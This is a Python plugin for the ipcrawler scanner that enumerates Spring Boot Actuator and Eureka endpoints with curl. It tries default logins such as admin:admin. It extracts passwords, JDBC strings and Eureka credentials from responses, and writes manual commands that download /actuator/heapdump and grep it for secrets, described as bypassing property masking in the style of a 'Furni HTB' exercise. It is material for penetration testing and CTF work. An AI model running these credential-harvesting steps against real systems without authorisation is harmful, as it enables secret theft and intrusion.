from ipcrawler.plugins import ServiceScan
from shutil import which
import os

class SpringBootActuator(ServiceScan):

	def __init__(self):
		super().__init__()
		self.name = "Spring Boot Actuator"
		self.slug = 'spring-boot-actuator'
		self.description = "Enumerates Spring Boot applications and actuator endpoints"
		self.priority = 0
		self.tags = ['default', 'safe', 'web', 'java']

	def _safe_str_lower(self, obj):
		"""Safely convert any object to lowercase string, handling CommandStreamReader"""
		if obj is None:
			return ''
		if hasattr(obj, 'lower'):
			return obj.lower()
		return str(obj).lower()

	def configure(self):
		self.add_option('threads', default=10, help='Number of threads for endpoint enumeration. Default: %(default)s')
		self.add_option('timeout', default=5, help='Request timeout in seconds. Default: %(default)s')
		self.add_list_option('common-paths', default=[
			'/', '/actuator', '/actuator/health', '/actuator/info', '/actuator/env',
			'/actuator/beans', '/actuator/configprops', '/actuator/mappings', '/actuator/metrics',
			'/actuator/heapdump', '/actuator/threaddump', '/actuator/trace', '/actuator/dump',
			'/actuator/features', '/actuator/loggers', '/actuator/shutdown', '/actuator/refresh',
			'/manage', '/management', '/admin', '/health', '/info', '/status',
			'/eureka', '/eureka/apps', '/eureka/status', '/v2/apps', '/eureka/apps/delta',
			'/error', '/trace', '/dump', '/autoconfig', '/beans', '/configprops'
		], help='Common Spring Boot and Eureka management endpoints to check. Default: %(default)s')
		
		# Match unknown services on common Spring Boot ports
		self.match_service_name('^unknown$')
		# Also match HTTP services that might be Spring Boot
		self.match_service_name('^http')
		self.match_service_name('^nacn_http$', negative_match=True)
		
		# Add comprehensive patterns for Spring Boot application identification
		# Spring Boot Framework Detection
		self.add_pattern(r'(?i)spring-boot[/-]?v?(\d+\.\d+\.\d+)', description='Spring Boot Framework v{match1} detected - modern Java microservice platform')
		self.add_pattern(r'(?i)whitelabel.error.page|default.error.view', description='Spring Boot Default Error Page exposed - potential information disclosure')
		self.add_pattern(r'(?i)org\.springframework\.boot', description='Spring Boot Framework classes detected - Java enterprise application')
		
		# Netflix Eureka Service Discovery
		self.add_pattern(r'(?i)eureka.instance.hostname[:\s]*([^\s,\n]+)', description='Netflix Eureka Service Discovery - hostname: {match1}')
		self.add_pattern(r'(?i)eureka.client.service-url.defaultZone[:\s]*([^\s,\n]+)', description='Eureka Default Zone URL: {match1} - service registry endpoint')
		self.add_pattern(r'(?i)"name"\s*:\s*"([^"]*eureka[^"]*)"', description='Eureka Service Instance: {match1} - microservice registration')
		self.add_pattern(r'(?i)netflix.eureka|service.registry', description='Netflix Eureka Service Registry detected - microservices architecture')
		
		# Spring Boot Actuator Endpoints (Critical Security Findings)
		self.add_pattern(r'(?i)"/actuator/env"', description='CRITICAL: Spring Actuator /env endpoint exposed - environment variables disclosure')
		self.add_pattern(r'(?i)"/actuator/configprops"', description='CRITICAL: Spring Actuator /configprops endpoint exposed - configuration properties disclosure')
		self.add_pattern(r'(?i)"/actuator/beans"', description='WARNING: Spring Actuator /beans endpoint exposed - application context disclosure')
		self.add_pattern(r'(?i)"/actuator/mappings"', description='INFO: Spring Actuator /mappings endpoint exposed - URL mappings disclosure')
		self.add_pattern(r'(?i)"/actuator/health"', description='INFO: Spring Actuator /health endpoint exposed - application health status')
		self.add_pattern(r'(?i)"/actuator/info"', description='INFO: Spring Actuator /info endpoint exposed - application information')
		self.add_pattern(r'(?i)"/actuator/metrics"', description='INFO: Spring Actuator /metrics endpoint exposed - application metrics')
		self.add_pattern(r'(?i)"/actuator/trace"', description='CRITICAL: Spring Actuator /trace endpoint exposed - HTTP request traces')
		self.add_pattern(r'(?i)"/actuator/dump"', description='CRITICAL: Spring Actuator /dump endpoint exposed - thread dump disclosure')
		self.add_pattern(r'(?i)"/actuator/heapdump"', description='CRITICAL: Spring Actuator /heapdump endpoint exposed - memory dump disclosure')
		self.add_pattern(r'(?i)management\.endpoints\.web\.exposure\.include[:\s=]*([^\s,\n]+)', description='Spring Actuator Endpoints Enabled: {match1}')
		
		# Spring Security Detection
		self.add_pattern(r'(?i)spring.security.oauth2|spring-security-oauth', description='Spring Security OAuth2 detected - authentication/authorization framework')
		self.add_pattern(r'(?i)JSESSIONID=([A-F0-9]+)', description='Java Session ID detected: {match1} - session management active')
		self.add_pattern(r'(?i)X-Frame-Options:\s*([^\n]+)', description='X-Frame-Options security header: {match1}')
		
		# Java Application Server Detection
		self.add_pattern(r'(?i)server:\s*apache-coyote.*tomcat[/-]?(\d+\.\d+)', description='Apache Tomcat v{match1} detected - Java servlet container')
		self.add_pattern(r'(?i)server:\s*jetty[/-]?(\d+\.\d+)', description='Eclipse Jetty v{match1} detected - Java HTTP server')
		self.add_pattern(r'(?i)server:\s*undertow[/-]?(\d+\.\d+)', description='Undertow v{match1} detected - Java web server (WildFly)')
		self.add_pattern(r'(?i)java.version[:\s=]*([^\s,\n]+)', description='Java Runtime Version: {match1}')
		self.add_pattern(r'(?i)java.vendor[:\s=]*([^\s,\n]+)', description='Java Vendor: {match1}')
		
		# Configuration and Database Exposure
		self.add_pattern(r'(?i)spring.datasource.url[:\s=]*([^\s,\n]+)', description='CRITICAL: Database Connection String exposed: {match1}')
		self.add_pattern(r'(?i)spring.datasource.username[:\s=]*([^\s,\n]+)', description='WARNING: Database Username exposed: {match1}')
		self.add_pattern(r'(?i)spring.profiles.active[:\s=]*([^\s,\n]+)', description='Spring Active Profiles: {match1} - environment configuration')
		
		# Heapdump Credential Extraction Patterns (Furni HTB style) - Raw memory strings
		self.add_pattern(r'password=([^&\s,\n}]+)', description='CRITICAL: Password credential found in heapdump: {match1}')
		self.add_pattern(r'{password=([^&]+)&[^}]*user=([^}]+)}', description='CRITICAL: User/Password pair found: user={match2}, password={match1}')
		self.add_pattern(r'EurekaSrvr:([^@]+)@([^:]+):(\d+)', description='CRITICAL: Eureka Server credentials found: password={match1} host={match2}:{match3}')
		self.add_pattern(r'http://([^:]+):([^@]+)@([^:]+):8761', description='CRITICAL: Eureka HTTP Basic Auth: user={match1}, password={match2}, server={match3}:8761')
		self.add_pattern(r'PWD=([^\s,\n]+)', description='INFO: PWD environment variable: {match1}')
		
		# Additional credential patterns for raw memory extraction
		self.add_pattern(r'user=([^&\s,\n}]+)', description='INFO: Username found in memory: {match1}')
		self.add_pattern(r'username=([^&\s,\n}]+)', description='INFO: Username found in memory: {match1}')
		self.add_pattern(r'jdbc:[^:]+://([^:]+):([^@]+)@([^:/]+)', description='CRITICAL: JDBC credentials found: user={match1}, password={match2}, host={match3}')
		self.add_pattern(r'://([^:]+):([^@]+)@([^:/]+):', description='CRITICAL: URL credentials found: user={match1}, password={match2}, host={match3}')
		
		# Cloud and Microservice Patterns
		self.add_pattern(r'(?i)spring.cloud.config.server', description='Spring Cloud Config Server detected - centralized configuration management')
		self.add_pattern(r'(?i)spring.cloud.gateway', description='Spring Cloud Gateway detected - API gateway service')
		self.add_pattern(r'(?i)spring.cloud.consul|spring.cloud.zookeeper', description='Spring Cloud Service Discovery detected - distributed systems')
		
		# Vulnerability Patterns
		self.add_pattern(r'(?i)spring.h2.console.enabled[:\s=]*true', description='CRITICAL: H2 Database Console enabled - potential RCE vulnerability')
		self.add_pattern(r'(?i)management.security.enabled[:\s=]*false', description='CRITICAL: Spring Actuator security disabled - unrestricted access')
		self.add_pattern(r'(?i)endpoints.env.enabled[:\s=]*true', description='WARNING: Environment endpoint enabled - potential information disclosure')

	def check(self):
		if which('curl') is None:
			self.error('The curl program could not be found. Make sure it is installed.')
			return False
		return True

	async def run(self, service):
		if service.protocol == 'tcp':
			# Get all hostnames to scan (discovered vhosts + fallback to IP)
			hostnames = service.target.get_all_hostnames()
			
			# Safety check for hostnames
			if not hostnames:
				service.error("❌ No hostnames available! Using IP fallback.")
				hostnames = [service.target.ip if service.target.ip else service.target.address]
			
			service.info(f"🌐 Scanning Spring Boot endpoints on: {', '.join(hostnames)}")
			
			# Scan each hostname
			for hostname in hostnames:
				hostname_label = hostname.replace('.', '_').replace(':', '_')
				service.info(f"🔧 Checking Spring Boot endpoints on: {hostname}")
				
				# Quick Spring Boot detection first - skip if not Spring Boot
				service.info(f"🔍 Quick Spring Boot detection...")
				timeout = self.get_option("timeout")
				
				# First check if /actuator endpoint exists (most reliable Spring Boot indicator)
				process, stdout, _ = await service.execute(
					f'curl -s -I -m {timeout} {{http_scheme}}://{hostname}:{{port}}/actuator 2>&1',
					outfile=None
				)
				
				spring_boot_detected = False
				if process.returncode == 0 and stdout:
					try:
						output_lines = await stdout.readlines()
						output_content = '\n'.join(output_lines) if output_lines else ''
						stdout_lower = output_content.lower()
						if any(indicator in stdout_lower for indicator in ['200 ok', '401 unauthorized', '403 forbidden']):
							spring_boot_detected = True
							service.info("🌱 Spring Boot Actuator endpoint detected!")
					except Exception as e:
						service.info(f"⚠️ Error reading actuator response: {e}")
				
				if not spring_boot_detected:
					# Quick check of main page for Spring Boot indicators
					process, stdout, _ = await service.execute(
						f'curl -s -m {timeout} {{http_scheme}}://{hostname}:{{port}}/ 2>&1 | head -10',
						outfile=None
					)
					
					# Properly read the CommandStreamReader output
					if process.returncode == 0 and stdout:
						try:
							output_lines = await stdout.readlines()
							output_content = '\n'.join(output_lines) if output_lines else ''
							stdout_lower = output_content.lower()
							
							# Enhanced detection for various Spring-based applications
							spring_indicators = ['spring', 'boot', 'whitelabel error', 'eureka', 'netflix', 'service registry', 'zuul', 'hystrix']
							if stdout_lower and any(indicator in stdout_lower for indicator in spring_indicators):
								spring_boot_detected = True
								if any(keyword in stdout_lower for keyword in ['eureka', 'netflix']):
									service.info("🎯 Netflix Eureka server detected!")
								else:
									service.info("🌱 Spring Boot application detected!")
							else:
								# Debug: Show what we actually found
								response_preview = output_content[:200] if output_content else 'No response'
								service.info(f"🔍 Response preview: {response_preview}...")
						except Exception as e:
							service.info(f"⚠️ Error reading response: {e}")
					else:
						service.info(f"🔍 Command failed or no output (exit code: {process.returncode})")
				
				if not spring_boot_detected:
					service.info("❌ No Spring Boot indicators found - skipping detailed enumeration")
					continue  # Skip to next hostname
				
				# Get detailed server info only if Spring Boot detected
				service.info(f"📋 Getting detailed Spring Boot information...")
				outfile_name = f'{{protocol}}_{{port}}_{{http_scheme}}_spring_boot_headers_{hostname_label}.txt'
				process, stdout, _ = await service.execute(
					f'echo "=== Basic HTTP Headers ===" && '
					f'curl -s -I -m {timeout} {{http_scheme}}://{hostname}:{{port}}/ 2>&1 && '
					f'echo "=== Response Body Sample ===" && '
					f'curl -s -m {timeout} {{http_scheme}}://{hostname}:{{port}}/ 2>&1 | head -20',
					outfile=outfile_name
				)
				
				# Check for Spring Boot actuator endpoints
				service.info(f"🔍 Enumerating Spring Boot actuator endpoints...")
				common_paths = self.get_option('common-paths')
				if not common_paths:
					common_paths = ['/actuator', '/health', '/info']
				
				# Create a list of URLs to check
				url_file = f'{{scandir}}/{{protocol}}_{{port}}_{{http_scheme}}_spring_boot_urls_{hostname_label}.txt'
				urls = [f'{{http_scheme}}://{hostname}:{{port}}{path}' for path in common_paths]
				
				# Write URLs to file for reference
				url_list = ' '.join([f'"{url}"' for url in urls])
				await service.execute(
					f'printf "%s\\n" {url_list} > {url_file}',
					outfile=None
				)
				
				# Use parallel curl to check endpoints much faster
				timeout = self.get_option("timeout")
				threads = self.get_option("threads")
				service.info(f"🚀 Checking {len(common_paths)} endpoints with {threads} threads, {timeout}s timeout...")
				
				# Use simpler approach - check each endpoint sequentially but with timeout
				endpoints_outfile = f'{{protocol}}_{{port}}_{{http_scheme}}_spring_boot_endpoints_{hostname_label}.txt'
				
				# Build a simple script to check all endpoints (EXCLUDING binary endpoints)
				commands = []
				for url in urls:
					commands.append(f'echo "=== Checking: {url} ==="')
					
					# Use HEAD request for binary endpoints to avoid downloading binary data
					if '/heapdump' in url or '/threaddump' in url:
						commands.append(f'curl -s -I -m {timeout} "{url}" -H "User-Agent: Mozilla/5.0 (compatible; IPCrawler)" 2>&1 || echo "Connection failed to {url}"')
						commands.append(f'echo "Note: Using HEAD request to avoid binary download"')
					else:
						# Normal GET request for non-binary endpoints
						commands.append(f'curl -s -m {timeout} "{url}" -H "User-Agent: Mozilla/5.0 (compatible; IPCrawler)" 2>&1 || echo "Connection failed to {url}"')
					commands.append('echo ""')
				
				check_script = ' && '.join(commands)
				process, stdout, _ = await service.execute(check_script, outfile=endpoints_outfile)
				
				# Check endpoint responses for additional service identification
				if process.returncode == 0:
					service.info("✅ Endpoint enumeration completed successfully")
				else:
					service.info("⚠️ Some endpoints may have failed")
				
				# Check for heapdump availability and extract credentials
				service.info(f"🧠 Checking for heapdump availability and credential extraction...")
				timeout = self.get_option("timeout")
				heapdump_outfile = f'{{protocol}}_{{port}}_{{http_scheme}}_spring_boot_heapdump_{hostname_label}.txt'
				
				# Check if heapdump is accessible
				process, stdout, _ = await service.execute(
					f'echo "=== Testing /actuator/heapdump endpoint ===" && '
					f'curl -s -I -m {timeout} {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump 2>&1',
					outfile=None
				)
				
				heapdump_available = False
				if process.returncode == 0 and stdout:
					try:
						output_lines = await stdout.readlines()
						output_content = '\n'.join(output_lines) if output_lines else ''
						if '200 ok' in output_content.lower():
							heapdump_available = True
							service.info("🚨 CRITICAL: Heapdump endpoint is accessible!")
					except Exception as e:
						service.info(f"⚠️ Error checking heapdump: {e}")
				
				if heapdump_available:
					# MANUAL HEAPDUMP EXTRACTION ONLY (avoids binary processing issues)
					service.info(f"🚨 CRITICAL: Heapdump endpoint detected - manual extraction required!")
					service.info(f"⚠️  Automatic heapdump processing disabled to prevent binary decode errors")
					service.info(f"📋 Manual commands have been generated for credential extraction")
					
					# Add heapdump extraction to manual commands instead of running automatically
					heapdump_file = f'heapdump_{{port}}_{hostname_label}.hprof'
					creds_file = f'RAW_CREDENTIALS_{{port}}_{hostname_label}.txt'
					
					# Create detailed manual commands for heapdump credential extraction
					service.add_manual_command(f'🚨 CRITICAL: Extract credentials from heapdump (bypasses Spring Boot ******)', [
						f'# FURNI HTB METHOD - Download and extract heapdump credentials',
						f'# This bypasses Spring Boot property masking to get real passwords',
						f'',
						f'# Step 1: Download the heapdump file',
						f'curl -s {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump -o {heapdump_file}',
						f'',
						f'# Step 2: Extract credentials using exact Furni HTB patterns',
						f'echo "=== FURNI HTB - PASSWORD= PATTERNS ===" > {creds_file}',
						f'strings {heapdump_file} | grep "password=" >> {creds_file}',
						f'echo "" >> {creds_file}',
						f'',
						f'echo "=== FURNI HTB - PWD ENVIRONMENT VARIABLES ===" >> {creds_file}',
						f'strings {heapdump_file} | grep "PWD" >> {creds_file}',
						f'echo "" >> {creds_file}',
						f'',
						f'echo "=== EUREKA SERVER CREDENTIALS ===" >> {creds_file}',
						f'strings {heapdump_file} | grep -E "EurekaSrvr.*@|://.*:.*@.*:8761" >> {creds_file}',
						f'echo "" >> {creds_file}',
						f'',
						f'echo "=== ALL HTTP BASIC AUTH URLS ===" >> {creds_file}',
						f'strings {heapdump_file} | grep -E "://.*:.*@" >> {creds_file}',
						f'',
						f'# Step 3: Quick preview of extracted credentials',
						f'echo "🔍 EXTRACTED CREDENTIALS:"',
						f'echo "=== Password patterns ==="',
						f'strings {heapdump_file} | grep "password=" | head -5',
						f'echo "=== PWD variables ==="',
						f'strings {heapdump_file} | grep "PWD" | head -3',
						f'echo "=== Eureka credentials ==="',
						f'strings {heapdump_file} | grep -E "EurekaSrvr.*@|://.*:.*@.*:8761" | head -3',
						f'',
						f'echo "✅ Full results saved to: {creds_file}"'
					])
				else:
					service.info("❌ Heapdump endpoint not accessible - trying alternative credential extraction...")
					
					# Alternative 1: Try raw environment endpoint 
					service.info("🔄 Attempting raw /env endpoint access...")
					env_outfile = f'{{protocol}}_{{port}}_{{http_scheme}}_spring_boot_env_raw_{hostname_label}.txt'
					await service.execute(
						f'echo "=== Trying raw /env endpoint ===" && '
						f'curl -s -m {timeout} {{http_scheme}}://{hostname}:{{port}}/env 2>&1 && '
						f'echo "=== Trying /actuator/env ===" && '
						f'curl -s -m {timeout} {{http_scheme}}://{hostname}:{{port}}/actuator/env 2>&1 && '
						f'echo "=== Trying with different headers ===" && '
						f'curl -s -m {timeout} -H "Accept: text/plain" {{http_scheme}}://{hostname}:{{port}}/actuator/env 2>&1',
						outfile=env_outfile
					)
					
					# Alternative 2: Try configprops endpoint
					service.info("🔄 Attempting configprops endpoint access...")
					config_outfile = f'{{protocol}}_{{port}}_{{http_scheme}}_spring_boot_config_raw_{hostname_label}.txt'
					await service.execute(
						f'echo "=== Trying /actuator/configprops ===" && '
						f'curl -s -m {timeout} {{http_scheme}}://{hostname}:{{port}}/actuator/configprops 2>&1 && '
						f'echo "=== Trying /configprops ===" && '
						f'curl -s -m {timeout} {{http_scheme}}://{hostname}:{{port}}/configprops 2>&1',
						outfile=config_outfile
					)
				
				# Check for common Spring Boot error pages and info disclosure
				service.info(f"🚨 Checking for information disclosure...")
				error_outfile = f'{{protocol}}_{{port}}_{{http_scheme}}_spring_boot_error_{hostname_label}.txt'
				await service.execute(
					f'echo "=== Testing /error endpoint ===" && '
					f'curl -v -m {timeout} {{http_scheme}}://{hostname}:{{port}}/error '
					f'-H "User-Agent: Mozilla/5.0 (compatible; IPCrawler)" 2>&1',
					outfile=error_outfile
				)
				
				# Try common authentication bypass techniques
				service.info(f"🔐 Testing authentication bypass techniques...")
				auth_outfile = f'{{protocol}}_{{port}}_{{http_scheme}}_spring_boot_auth_test_{hostname_label}.txt'
				await service.execute(
					f'echo "=== Testing admin:admin ===" && '
					f'curl -v -s -m {timeout} -u admin:admin {{http_scheme}}://{hostname}:{{port}}/ 2>&1 && '
					f'printf "\\n=== Testing default:default ===\\n" && '
					f'curl -v -s -m {timeout} -u default:default {{http_scheme}}://{hostname}:{{port}}/ 2>&1 && '
					f'printf "\\n=== Testing empty credentials ===\\n" && '
					f'curl -v -s -m {timeout} -u : {{http_scheme}}://{hostname}:{{port}}/ 2>&1',
					outfile=auth_outfile
				)
				
				service.info(f"✅ Spring Boot enumeration completed for {hostname}")
				
				# Try to read output files to identify service type for reporting
				try:
					header_file = f'{{scandir}}/{{protocol}}_{{port}}_{{http_scheme}}_spring_boot_headers_{hostname_label}.txt'
					header_file_expanded = header_file.format(
						scandir=service.target.basedir + '/scans',
						protocol=service.protocol,
						port=service.port,
						http_scheme='https' if service.secure else 'http'
					)
					
					# Try to read and analyze the headers file for service identification
					if os.path.exists(header_file_expanded):
						with open(header_file_expanded, 'r') as f:
							content = f.read().lower()
							if any(keyword in content for keyword in ['spring', 'boot', 'actuator']):
								service.info("🌱 Spring Boot detected - updating service name")
							elif any(keyword in content for keyword in ['eureka', 'netflix']):
								service.info("🎯 Netflix Eureka detected - updating service name")
							elif 'jsessionid' in content or any(keyword in content for keyword in ['tomcat', 'jetty']):
								service.info("☕ Java web application detected - updating service name")
				except Exception as e:
					service.info(f"📝 Service analysis completed (could not read output files for identification)")

	def manual(self, service, _):
		# Get all hostnames to scan
		hostnames = service.target.get_all_hostnames()
		if not hostnames:
			hostnames = [service.target.ip if service.target.ip else service.target.address]
		
		for hostname in hostnames:
			hostname_desc = f" ({hostname})" if hostname != service.target.ip else " (IP fallback)"
			
			service.add_manual_command(f'Spring Boot Actuator enumeration{hostname_desc}:', [
				f'# Basic connectivity test',
				f'curl -s -I {{http_scheme}}://{hostname}:{{port}}/',
				f'',
				f'# Check actuator endpoints',
				f'for endpoint in /actuator /actuator/health /actuator/info /actuator/env /actuator/beans /actuator/heapdump; do',
				f'  echo "=== $endpoint ===";',
				f'  curl -s {{http_scheme}}://{hostname}:{{port}}$endpoint;',
				f'  echo "";',
				f'done',
				f'',
				f'# CRITICAL: Download and analyze heapdump for credentials (Furni HTB method)',
				f'curl -s {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump -o heapdump_{{port}}.hprof',
				f'# Search for password= patterns as seen in Furni HTB',
				f'strings heapdump_{{port}}.hprof | grep "password=" | head -20',
				f'# Search for PWD environment variables',
				f'strings heapdump_{{port}}.hprof | grep "PWD" | head -15',
				f'# Search for Eureka server credentials (EurekaSrvr pattern)',
				f'strings heapdump_{{port}}.hprof | grep -iE "EurekaSrvr.*@|://.*:.*@.*:8761" | head -10',
				f'# Search for user/password pairs',
				f'strings heapdump_{{port}}.hprof | grep -iE "{{password=.*&.*user=|user=.*password=}}" | head -10',
				f'# Search for HTTP Basic Auth URLs',
				f'strings heapdump_{{port}}.hprof | grep -iE "://.*:.*@" | head -10',
				f'# Search for database URLs',
				f'strings heapdump_{{port}}.hprof | grep -i "jdbc:" | head -10',
				f'# Search for API keys and tokens',
				f'strings heapdump_{{port}}.hprof | grep -iE "(api.?key|secret|token)" | head -15',
				f'',
				f'# Test common credentials',
				f'curl -s -u admin:admin {{http_scheme}}://{hostname}:{{port}}/',
				f'curl -s -u admin:password {{http_scheme}}://{hostname}:{{port}}/',
				f'',
				f'# Check for management interfaces',
				f'curl -s {{http_scheme}}://{hostname}:{{port}}/manage',
				f'curl -s {{http_scheme}}://{hostname}:{{port}}/admin',
				f'',
				f'# Check Eureka apps and services',
				f'curl -s {{http_scheme}}://{hostname}:{{port}}/eureka/apps',
				f'curl -s {{http_scheme}}://{hostname}:{{port}}/v2/apps'
			])